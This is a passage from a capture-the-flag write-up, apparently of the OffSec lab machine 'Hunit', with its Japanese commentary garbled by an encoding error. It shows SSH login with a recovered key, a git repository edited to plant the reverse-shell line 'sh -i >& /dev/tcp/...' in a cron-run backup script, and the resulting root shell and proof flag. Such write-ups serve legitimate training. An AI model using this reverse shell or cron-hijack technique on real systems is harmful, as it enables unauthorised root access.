ZAWLtDFnWQV7eMF9RCNBVSWBbeQITbZDSbctg5P0H35ioPu67Pygo9SfSRXpBPVBI13feB
<snip>

```

```bash
â”Œâ”€â”€(l3ickeyğŸ¥ºkali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Hunit]
â””â”€$ chmod 600 git_rsa

â”Œâ”€â”€(l3ickeyğŸ¥ºkali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Hunit]
â””â”€$ ssh -i git_rsa git@192.168.150.125 -p 43022
git> 

```

`git` ãƒ¦ãƒ¼ã‚¶ã¨ã—ã¦ãƒ­ã‚°ã‚¤ãƒ³ã—ãŸãŒï¼Œ`git-shell` ã®ä½¿ã„æ–¹ãŒã‚ã‹ã‚‰ãªã„ï¼ã©ã†ã‚„ã‚‰ `git` ã‚³ãƒãƒ³ãƒ‰ã®å®Ÿè¡ŒãŒå¯èƒ½ãªã‚ˆã†ã ãŒï¼Œå®Ÿè¡Œã§ããªã„ï¼

```bash
git> git status
unrecognized command 'git'

```

ã©ã†ã‚„ã‚‰ `GIT_SSH_COMMAND` ã¨ã„ã†ç’°å¢ƒå¤‰æ•°ã§ï¼Œ `ssh` å…ˆã®ãƒªãƒã‚¸ãƒˆãƒªã‚’ãƒ­ãƒ¼ã‚«ãƒ«ã« `git clone` ã™ã‚‹ã“ã¨ãŒã§ãã‚‹ï¼

```bash
â”Œâ”€â”€(l3ickeyğŸ¥ºkali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Hunit]
â””â”€$ GIT_SSH_COMMAND="ssh -i git_rsa -p 43022" git clone git@192.168.150.125:/git-server
Cloning into 'git-server'...
remote: Enumerating objects: 12, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 12 (delta 2), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (12/12), done.
Resolving deltas: 100% (2/2), done.

```

ãƒ­ãƒ¼ã‚«ãƒ«ã§ `backup.sh` ã‚’ç·¨é›†ã™ã‚‹ï¼

```bash
â”Œâ”€â”€(l3ickeyğŸ¥ºkali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Hunit]
â””â”€$ cd git-server

â”Œâ”€â”€(l3ickeyğŸ¥ºkali)-[~/â€¦/pentest-cheat-sheet/offsec-pg/Hunit/git-server]
â””â”€$ ls
NEW_CHANGE  README  backups.sh

â”Œâ”€â”€(l3ickeyğŸ¥ºkali)-[~/â€¦/pentest-cheat-sheet/offsec-pg/Hunit/git-server]
â””â”€$ vi backups.sh

â”Œâ”€â”€(l3ickeyğŸ¥ºkali)-[~/â€¦/pentest-cheat-sheet/offsec-pg/Hunit/git-server]
â””â”€$ cat backups.sh
#!/bin/bash
sh -i >& /dev/tcp/192.168.49.150/43022 0>&1

â”Œâ”€â”€(l3ickeyğŸ¥ºkali)-[~/â€¦/pentest-cheat-sheet/offsec-pg/Hunit/git-server]
â””â”€$ chmod 777 backups.sh

â”Œâ”€â”€(l3ickeyğŸ¥ºkali)-[~/â€¦/pentest-cheat-sheet/offsec-pg/Hunit/git-server]
â””â”€$ git add backups.sh

â”Œâ”€â”€(l3ickeyğŸ¥ºkali)-[~/â€¦/pentest-cheat-sheet/offsec-pg/Hunit/git-server]
â””â”€$ git commit -m "pwn"
[master f5e9953] pwn
 1 file changed, 1 insertion(+), 4 deletions(-)
 mode change 100644 => 100755 backups.sh

```

`nc` ã§ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ã‚’å¾…ã¡å—ã‘ï¼Œ`git push` ã‚’è¡Œã†ï¼

```bash
â”Œâ”€â”€(l3ickeyğŸ‘»kali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Hunit]
â””â”€$ nc -lnvp 43022
listening on [any] 43022 ...

```

éµã®ãƒ‘ã‚¹ã‚’è¦ªãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«å¤‰æ›´ã—ï¼Œ`git push` ã‚’å®Ÿè¡Œã™ã‚‹ï¼

```bash
â”Œâ”€â”€(l3ickeyğŸ¥ºkali)-[~/â€¦/pentest-cheat-sheet/offsec-pg/Hunit/git-server]
â””â”€$ GIT_SSH_COMMAND="ssh -i ../git_rsa -p 43022" git push
Enumerating objects: 5, done.
Counting objects: 100% (5/5), done.
Delta compression using up to 24 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 374 bytes | 374.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
To 192.168.150.125:/git-server
   b50f4e5..f5e9953  master -> master

```

`cron job` ãŒå®Ÿè¡Œã•ã‚Œã‚‹ã¾ã§æœ€å¤§6åˆ†å¾…ã¡ï¼Œãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ã‚’å—ã‘å–ã‚‹ï¼

```bash
â”Œâ”€â”€(l3ickeyğŸ‘»kali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Hunit]
â””â”€$ nc -lnvp 43022
listening on [any] 43022 ...
connect to [192.168.49.150] from (UNKNOWN) [192.168.150.125] 52052
sh: cannot set terminal process group (1518): Inappropriate ioctl for device
sh: no job control in this shell
sh-5.0# id
id
uid=0(root) gid=0(root) groups=0(root)
sh-5.0# pwd
pwd
/root
sh-5.0# ls
ls
git-server
proof.txt
pull.sh
sh-5.0# cat proof.txt
cat proof.txt
64c32d5af552b16da54342b1553be570
sh-5.0#

```

`proof.txt` ã‚’æ‰‹ã«å…¥ã‚Œã‚‹ã“ã¨ãŒã§ããŸï¼

## When you are stuck

- [ ] Are there any areas where you are guessing "it would be ____" without examining the details?

- [ ] Have you tried "all" the information available on the internet? 

